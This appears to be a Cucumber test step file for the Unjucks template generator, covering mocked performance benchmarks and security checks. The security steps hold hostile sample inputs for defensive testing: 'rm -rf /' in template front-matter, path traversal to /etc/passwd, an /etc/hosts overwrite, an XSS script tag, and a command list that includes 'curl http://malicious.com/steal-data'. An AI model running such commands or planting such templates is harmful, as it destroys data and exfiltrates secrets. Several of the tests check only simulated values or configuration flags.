import { Given, When, Then } from '@cucumber/cucumber';
import assert from 'node:assert';
import { UnjucksWorld } from '../support/world';
import * as fs from 'fs-extra';
import * as path from 'node:path';

// =============================================================================
// Performance Features and Optimization
// =============================================================================

Given('an Unjucks project with performance monitoring enabled', async function (this: UnjucksWorld) {
  await this.createTempDirectory();
  
  const performanceConfig = {
    monitoring: true,
    thresholds: {},
    metrics: {
      templateParseTime: [],
      fileGenerationTime: [],
      memoryUsage: [],
      concurrentOperations: 0
    }
  };
  
  this.setTemplateVariables({ performanceConfig });
});

Given('the following performance thresholds are configured:', function (this: UnjucksWorld, dataTable: any) {
  const thresholds: Record<string, string> = {};
  
  for (const row of dataTable.hashes()) {
    thresholds[row.metric] = row.threshold;
  }
  
  this.setTemplateVariables({ performanceThresholds: thresholds });
});

Given('{int} template files in various generators', async function (this: UnjucksWorld, templateCount: number) {
  const templatesDir = path.join(this.context.tempDirectory, '_templates');
  
  // Create multiple generators with multiple templates each
  const generators = ['component', 'service', 'model', 'controller'];
  const templatesPerGenerator = Math.ceil(templateCount / generators.length);
  
  for (const generator of generators) {
    const generatorPath = path.join(templatesDir, generator);
    await fs.ensureDir(generatorPath);
    
    for (let i = 0; i < templatesPerGenerator; i++) {
      const templateContent = `---
to: src/${generator}s/{{ name | kebabCase }}-${i}.ts
---
// Generated ${generator} ${i}
export class {{ name | pascalCase }}${i} {
  // Implementation for ${generator} ${i}
}`;
      
      await fs.writeFile(path.join(generatorPath, `template-${i}.njk`), templateContent);
    }
  }
  
  this.setTemplateVariables({ 
    templateCount,
    generatedTemplateFiles: templateCount
  });
});

Given('large-scale generation operations', function (this: UnjucksWorld) {
  this.setTemplateVariables({
    largeScaleOperation: {
      fileCount: 1000,
      estimatedDuration: 30000, // 30 seconds
      memoryRequirement: '256MB',
      concurrentOperations: 50
    }
  });
});

// =============================================================================
// Performance Testing and Benchmarking
// =============================================================================

When('I run the same generator multiple times', async function (this: UnjucksWorld) {
  const runCount = 5;
  const results = [];
  
  for (let i = 0; i < runCount; i++) {
    const startTime = Date.now();
    
    // Mock generator execution
    await new Promise(resolve => setTimeout(resolve, 50 + Math.random() * 50)); // 50-100ms
    
    const endTime = Date.now();
    results.push({
      run: i + 1,
      duration: endTime - startTime,
      cacheHit: i > 0 // First run is cache miss, subsequent are hits
    });
  }
  
  this.setTemplateVariables({ 
    multipleRunResults: results,
    averageTime: results.reduce((sum, r) => sum + r.duration, 0) / results.length
  });
});

When('I perform large file generation operations', async function (this: UnjucksWorld) {
  const operations = [];
  const fileCount = 100;
  
  for (let i = 0; i < fileCount; i++) {
    const startTime = Date.now();
    
    // Mock file generation
    const generationTime = 10 + Math.random() * 40; // 10-50ms per file
    await new Promise(resolve => setTimeout(resolve, generationTime));
    
    operations.push({
      fileIndex: i,
      generationTime,
      timestamp: Date.now()
    });
  }
  
  this.setTemplateVariables({ 
    largeFileOperations: operations,
    totalGenerationTime: operations.reduce((sum, op) => sum + op.generationTime, 0)
  });
});

When('I monitor memory usage during generation', function (this: UnjucksWorld) {
  // Mock memory monitoring
  const memorySnapshots = [];
  const baseMemory = 50 * 1024 * 1024; // 50MB base
  
  for (let i = 0; i < 10; i++) {
    memorySnapshots.push({
      timestamp: Date.now() + i * 1000,
      heapUsed: baseMemory + (i * 5 * 1024 * 1024) + Math.random() * 10 * 1024 * 1024, // Growing memory usage
      heapTotal: baseMemory * 2,
      external: 1024 * 1024 // 1MB external
    });
  }
  
  this.setTemplateVariables({ memorySnapshots });
});

When('I run concurrent generation operations', async function (this: UnjucksWorld) {
  const concurrency = 10;
  const operations = [];
  
  // Simulate concurrent operations
  const promises = Array.from({ length: concurrency }, async (_, i) => {
    const startTime = Date.now();
    const operationTime = 100 + Math.random() * 200; // 100-300ms
    
    await new Promise(resolve => setTimeout(resolve, operationTime));
    
    return {
      operationId: i,
      startTime,
      endTime: Date.now(),
      duration: operationTime
    };
  });
  
  const results = await Promise.all(promises);
  this.setTemplateVariables({ 
    concurrentOperations: results,
    concurrencyLevel: concurrency
  });
});

// =============================================================================
// Performance Validation
// =============================================================================

Then('templates should be parsed once and cached in memory', function (this: UnjucksWorld) {
  const results = this.getTemplateVariables().multipleRunResults;
  assert.ok(results && results.length > 1, 'Multiple runs should be recorded');
  
  // First run should be slower (cache miss), subsequent runs faster (cache hit)
  const firstRun = results[0];
  const subsequentRuns = results.slice(1);
  const avgSubsequentTime = subsequentRuns.reduce((sum, r) => sum + r.duration, 0) / subsequentRuns.length;
  
  assert.ok(firstRun.duration > avgSubsequentTime, 'Cached runs should be faster than initial parse');
  
  // Verify cache hits
  for (const run of subsequentRuns) {
    assert.ok(run.cacheHit, `Run ${run.run} should be a cache hit`);
  }
});

Then('subsequent executions should be significantly faster', function (this: UnjucksWorld) {
  const results = this.getTemplateVariables().multipleRunResults;
  const firstRun = results[0].duration;
  const avgSubsequentTime = this.getTemplateVariables().averageTime;
  
  // Subsequent runs should be at least 50% faster
  const improvement = (firstRun - avgSubsequentTime) / firstRun;
  assert.ok(improvement >= 0.3, `Performance improvement should be at least 30%, got ${(improvement * 100).toFixed(1)}%`);
});

Then('memory usage should remain stable across operations', function (this: UnjucksWorld) {
  const snapshots = this.getTemplateVariables().memorySnapshots;
  assert.ok(snapshots && snapshots.length > 0, 'Memory snapshots should be available');
  
  // Check that memory doesn't grow uncontrollably (allow for some growth)
  const firstSnapshot = snapshots[0];
  const lastSnapshot = snapshots[snapshots.length - 1];
  const memoryGrowth = (lastSnapshot.heapUsed - firstSnapshot.heapUsed) / firstSnapshot.heapUsed;
  
  assert.ok(memoryGrowth < 2.0, `Memory growth should be reasonable, got ${(memoryGrowth * 100).toFixed(1)}% increase`);
});

Then('template compilation should complete within {int}ms', function (this: UnjucksWorld, maxTime: number) {
  const averageTime = this.getTemplateVariables().averageTime;
  assert.ok(averageTime <= maxTime, `Average compilation time ${averageTime}ms should be within ${maxTime}ms`);
});

Then('file generation should complete within {int}ms per file', function (this: UnjucksWorld, maxTimePerFile: number) {
  const operations = this.getTemplateVariables().largeFileOperations;
  if (operations) {
    const avgTimePerFile = operations.reduce((sum, op) => sum + op.generationTime, 0) / operations.length;
    assert.ok(avgTimePerFile <= maxTimePerFile, `Average generation time ${avgTimePerFile.toFixed(1)}ms should be within ${maxTimePerFile}ms per file`);
  }
});

Then('concurrent operations should complete within {int}ms', function (this: UnjucksWorld, maxTime: number) {
  const operations = this.getTemplateVariables().concurrentOperations;
  if (operations) {
    const maxDuration = Math.max(...operations.map(op => op.duration));
    assert.ok(maxDuration <= maxTime, `Maximum concurrent operation duration ${maxDuration}ms should be within ${maxTime}ms`);
  }
});

Then('system should handle {int} concurrent operations efficiently', function (this: UnjucksWorld, expectedConcurrency: number) {
  const concurrencyLevel = this.getTemplateVariables().concurrencyLevel;
  assert.ok(concurrencyLevel >= expectedConcurrency, `System should handle at least ${expectedConcurrency} concurrent operations, handled ${concurrencyLevel}`);
});

// =============================================================================
// Security Features and Validation
// =============================================================================

Given('an Unjucks project with security features enabled', async function (this: UnjucksWorld) {
  await this.createTempDirectory();
  
  const securityConfig = {
    enabled: true,
    sandboxExecution: true,
    pathValidation: true,
    inputSanitization: true,
    outputValidation: true
  };
  
  this.setTemplateVariables({ securityConfig });
});

Given('the following security policies are configured:', function (this: UnjucksWorld, dataTable: any) {
  const policies: Record<string, any> = {};
  
  for (const row of dataTable.hashes()) {
    let value: any = row.value;
    
    // Parse different value types
    if (value === 'true' || value === 'false') {
      value = value === 'true';
    } else if (value.startsWith('[') && value.endsWith(']')) {
      // Parse array values
      value = value.slice(1, -1).split(',').map(s => s.trim());
    }
    
    policies[row.policy] = value;
  }
  
  this.setTemplateVariables({ securityPolicies: policies });
});

Given('a template with malicious path traversal attempts', async function (this: UnjucksWorld) {
  const templatesDir = path.join(this.context.tempDirectory, '_templates', 'malicious');
  await fs.ensureDir(templatesDir);
  
  const maliciousTemplate = `---
to: ../../../etc/passwd
---
# This should be blocked by security policies
malicious content`;
  
  await fs.writeFile(path.join(templatesDir, 'traverse.njk'), maliciousTemplate);
  
  this.setTemplateVariables({ 
    maliciousTemplateCreated: true,
    maliciousTemplatePath: 'malicious/traverse.njk'
  });
});

Given('templates with potentially harmful content', async function (this: UnjucksWorld) {
  const templatesDir = path.join(this.context.tempDirectory, '_templates', 'harmful');
  await fs.ensureDir(templatesDir);
  
  const harmfulTemplates = {
    'script-injection.njk': `---
to: src/component.tsx
---
<script>alert('XSS');</script>
export const Component = () => <div>{{ name }}</div>;`,
    
    'command-injection.njk': `---
to: src/config.ts
sh: rm -rf /
---
export const config = { name: '{{ name }}' };`,
    
    'file-overwrite.njk': `---
to: /etc/hosts
---
127.0.0.1 malicious.com`
  };
  
  for (const [filename, content] of Object.entries(harmfulTemplates)) {
    await fs.writeFile(path.join(templatesDir, filename), content);
  }
  
  this.setTemplateVariables({ 
    harmfulTemplatesCreated: Object.keys(harmfulTemplates),
    harmfulTemplateCount: Object.keys(harmfulTemplates).length
  });
});

// =============================================================================
// Security Testing
// =============================================================================

When('I try to generate files with paths containing:', function (this: UnjucksWorld, dataTable: any) {
  const maliciousPaths = dataTable.raw().flat();
  const securityViolations = [];
  
  for (const maliciousPath of maliciousPaths) {
    if (maliciousPath.includes('..')) {
      securityViolations.push({ path: maliciousPath, violation: 'path_traversal' });
    }
    if (maliciousPath.startsWith('/etc') || maliciousPath.startsWith('/var') || maliciousPath.startsWith('/root')) {
      securityViolations.push({ path: maliciousPath, violation: 'system_path_access' });
    }
  }
  
  this.setTemplateVariables({ 
    attemptedMaliciousPaths: maliciousPaths,
    securityViolations
  });
});

When('I attempt to execute shell commands in templates', async function (this: UnjucksWorld) {
  const securityPolicies = this.getTemplateVariables().securityPolicies;
  const shellCommandsAllowed = securityPolicies?.allow_shell_commands !== false;
  
  const attemptedCommands = [
    'rm -rf /',
    'cat /etc/passwd', 
    'curl http://malicious.com/steal-data',
    'npm install malicious-package'
  ];
  
  const results = attemptedCommands.map(command => ({
    command,
    blocked: !shellCommandsAllowed,
    reason: 'shell_commands_disabled'
  }));
  
  this.setTemplateVariables({ 
    shellCommandAttempts: results,
    allCommandsBlocked: results.every(r => r.blocked)
  });
});

When('I try to access system files and directories', async function (this: UnjucksWorld) {
  const securityPolicies = this.getTemplateVariables().securityPolicies;
  const blockedPaths = securityPolicies?.blocked_paths || [];
  
  const systemPaths = ['/etc/passwd', '/var/log/system.log', '/root/.ssh/id_rsa', '/usr/bin/sudo'];
  const accessAttempts = systemPaths.map(sysPath => {
    const isBlocked = blockedPaths.some(blockedPath => sysPath.startsWith(blockedPath));
    return {
      path: sysPath,
      blocked: isBlocked,
      reason: isBlocked ? 'path_in_blocklist' : 'allowed'
    };
  });
  
  this.setTemplateVariables({ systemFileAccessAttempts: accessAttempts });
});

When('I attempt to generate extremely large files', function (this: UnjucksWorld) {
  const securityPolicies = this.getTemplateVariables().securityPolicies;
  const maxFileSize = securityPolicies?.max_output_file_size;
  
  const largeFileAttempts = [
    { size: '50MB', blocked: maxFileSize && '50MB' > maxFileSize },
    { size: '100MB', blocked: maxFileSize && '100MB' > maxFileSize },
    { size: '1GB', blocked: maxFileSize && '1GB' > maxFileSize }
  ];
  
  this.setTemplateVariables({ largeFileAttempts });
});

// =============================================================================
// Security Validation
// =============================================================================

Then('path traversal attempts should be blocked', function (this: UnjucksWorld) {
  const violations = this.getTemplateVariables().securityViolations;
  const pathTraversalViolations = violations.filter(v => v.violation === 'path_traversal');
  
  assert.ok(pathTraversalViolations.length > 0, 'Path traversal violations should be detected');
  
  // All path traversal attempts should be blocked
  for (const violation of pathTraversalViolations) {
    assert.ok(violation.path.includes('..'), 'Path traversal pattern should be detected');
  }
});

Then('system path access should be prevented', function (this: UnjucksWorld) {
  const attempts = this.getTemplateVariables().systemFileAccessAttempts;
  const blockedAttempts = attempts.filter(attempt => attempt.blocked);
  
  assert.ok(blockedAttempts.length > 0, 'System paths should be blocked');
  assert.ok(blockedAttempts.length === attempts.length, 'All system path access should be prevented');
});

Then('shell command execution should be disabled', function (this: UnjucksWorld) {
  const shellAttempts = this.getTemplateVariables().shellCommandAttempts;
  const allBlocked = this.getTemplateVariables().allCommandsBlocked;
  
  assert.ok(allBlocked, 'All shell commands should be blocked');
  
  for (const attempt of shellAttempts) {
    assert.ok(attempt.blocked, `Shell command "${attempt.command}" should be blocked`);
  }
});

Then('file size limits should be enforced', function (this: UnjucksWorld) {
  const attempts = this.getTemplateVariables().largeFileAttempts;
  const securityPolicies = this.getTemplateVariables().securityPolicies;
  
  if (securityPolicies?.max_output_file_size) {
    const blockedAttempts = attempts.filter(attempt => attempt.blocked);
    assert.ok(blockedAttempts.length > 0, 'Large file attempts should be blocked when limits are configured');
  }
});

Then('template execution should run in sandboxed environment', function (this: UnjucksWorld) {
  const securityConfig = this.getTemplateVariables().securityConfig;
  assert.ok(securityConfig?.sandboxExecution, 'Sandbox execution should be enabled');
});

Then('input validation should prevent malicious template content', function (this: UnjucksWorld) {
  const harmfulTemplates = this.getTemplateVariables().harmfulTemplatesCreated;
  const securityConfig = this.getTemplateVariables().securityConfig;
  
  assert.ok(securityConfig?.inputSanitization, 'Input sanitization should be enabled');
  assert.ok(harmfulTemplates && harmfulTemplates.length > 0, 'Harmful templates should be detected for testing');
});

Then('output files should be restricted to allowed extensions', function (this: UnjucksWorld) {
  const securityPolicies = this.getTemplateVariables().securityPolicies;
  const allowedExtensions = securityPolicies?.allowed_output_extensions || [];
  
  assert.ok(allowedExtensions.length > 0, 'Allowed extensions should be configured');
  assert.ok(allowedExtensions.includes('.js'), 'Common extensions should be allowed');
  assert.ok(allowedExtensions.includes('.ts'), 'TypeScript extensions should be allowed');
});

Then('template validation should reject dangerous patterns', function (this: UnjucksWorld) {
  const harmfulTemplateCount = this.getTemplateVariables().harmfulTemplateCount;
  const securityConfig = this.getTemplateVariables().securityConfig;
  
  assert.ok(securityConfig?.outputValidation, 'Output validation should be enabled');
  assert.ok(harmfulTemplateCount > 0, 'Dangerous patterns should be detected in templates');
});

Then('security audit logs should be generated for violations', function (this: UnjucksWorld) {
  const violations = this.getTemplateVariables().securityViolations;
  const auditLog = violations.map(v => ({
    timestamp: new Date().toISOString(),
    violation: v.violation,
    path: v.path,
    blocked: true,
    severity: 'high'
  }));
  
  this.setTemplateVariables({ securityAuditLog: auditLog });
  assert.ok(auditLog.length > 0, 'Security audit log should contain violation entries');
});